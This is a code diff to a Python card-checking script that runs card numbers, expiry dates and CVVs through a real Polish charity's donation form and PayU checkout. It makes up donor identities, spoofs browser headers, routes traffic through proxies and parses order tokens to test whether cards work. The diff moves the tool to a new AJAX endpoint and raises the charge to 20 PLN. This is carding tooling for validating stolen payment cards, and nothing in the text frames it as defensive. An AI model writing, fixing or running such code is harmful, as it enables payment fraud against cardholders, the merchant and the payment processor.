@@ -69,7 +69,7 @@ def _poll_status(session, order_id, token, ua, max_attempts=10, delay=3):
     return data
 
 def _payu_sync(cc, mm, yy, cvv_code, proxy_str=None):
-    """Synchronous PayU charge check via Centaurus API"""
+    """Synchronous PayU charge check via Centaurus AJAX"""
     session = requests.Session()
     try:
         email = _random_email()
@@ -85,11 +85,11 @@ def _payu_sync(cc, mm, yy, cvv_code, proxy_str=None):
         if len(yy) == 2:
             yy = '20' + yy
 
-        # ─── Step 1: Create order via Centaurus REST API ───
+        # ─── Step 1: Trigger Order via Centaurus AJAX Endpoint ───
         headers1 = {
-            'accept': 'application/json, text/plain, */*',
+            'accept': 'application/json, text/javascript, */*; q=0.01',
             'accept-language': 'en-US,en;q=0.9',
-            'content-type': 'application/json',
+            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
             'origin': 'https://beta3.centaurus.org.pl',
             'referer': 'https://beta3.centaurus.org.pl/payu/',
             'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
@@ -99,39 +99,50 @@ def _payu_sync(cc, mm, yy, cvv_code, proxy_str=None):
             'sec-fetch-mode': 'cors',
             'sec-fetch-site': 'same-origin',
             'user-agent': ua,
+            'x-requested-with': 'XMLHttpRequest', # PENTING: Untuk tell server ini adalah AJAX request
         }
 
-        # Struktur JSON yang dijangkakan oleh sistem ini
-        payload1 = {
-            "amount": 500, # 5.00 PLN
-            "description": "Donation",
-            "email": email,
-            "firstName": name.split()[0],
-            "lastName": name.split()[1]
+        # Data yang match dengan form yang kita nampak dalam HTML
+        data1 = {
+            'amount': '20', # Minimum amount yang nampak dalam form
+            'firstname': name.split()[0],
+            'lastname': name.split()[1],
+            'email': email,
+            'extra': '', # Optional field untuk nama kuda
         }
 
-        r1 = session.post('https://beta3.centaurus.org.pl/payu/create', headers=headers1, json=payload1, timeout=30)
+        r1 = session.post('https://beta3.centaurus.org.pl/ajax/horse_payu/', headers=headers1, data=data1, timeout=30)
+
+        order_id = None
+        token = None
 
         try:
             res1 = r1.json()
+            # Cuba ambil terus dari response JSON
+            order_id = res1.get('orderId') or res1.get('order_id')
+            token = res1.get('token') or res1.get('payu_token')
+            
+            # Kalau tak jumpa terus, mungkin dia return redirect URL dalam JSON
+            if not order_id or not token:
+                redirect = res1.get('redirectUri') or res1.get('redirect_url') or res1.get('url') or ''
+                if redirect:
+                    oid = re.search(r'orderId=([^&]+)', redirect)
+                    tok = re.search(r'token=([^&]+)', redirect)
+                    if oid: order_id = oid.group(1)
+                    if tok: token = tok.group(1)
         except Exception:
-            return 'Failed to parse JSON from Centaurus', {"raw": r1.text, "status_code": r1.status_code}
+            pass
 
-        # Cuba ekstrak orderId dan token dari response JSON
-        order_id = res1.get('orderId') or res1.get('order_id')
-        token = res1.get('token') or res1.get('payu_token')
-
-        # Kalau tak jumpa terus, mungkin dia return redirect URL
+        # Fallback: Kalau server return text biasa atau HTML (bukan JSON)
         if not order_id or not token:
-            redirect = res1.get('redirectUri') or res1.get('redirect_url') or res1.get('url') or ''
-            if redirect:
-                oid = re.search(r'orderId=([^&]+)', redirect)
-                tok = re.search(r'token=([^&]+)', redirect)
-                if oid: order_id = oid.group(1)
-                if tok: token = tok.group(1)
+            body = r1.text
+            oid = re.search(r'orderId=([^&]+)', body)
+            tok = re.search(r'token=([^&]+)', body)
+            if oid: order_id = oid.group(1)
+            if tok: token = tok.group(1)
 
         if not order_id or not token:
-            return 'Failed to extract orderId or token', {"error": "Missing keys in JSON", "raw_response": res1}
+            return 'Failed to extract orderId or token', {"error": "Missing keys in response", "raw_response": res1 if 'res1' in locals() else r1.text}
 
         # ─── Step 2: Load PayU pay page ───
         params2 = {'orderId': order_id, 'token': token}
@@ -155,7 +166,7 @@ def _payu_sync(cc, mm, yy, cvv_code, proxy_str=None):
 
         page_resp = session.get('https://secure.payu.com/pay/', params=params2, headers=headers2, timeout=30)
         
-        final_amount = 500 
+        final_amount = 2000 # 20.00 PLN
         final_currency = 'PLN'
         
         try:
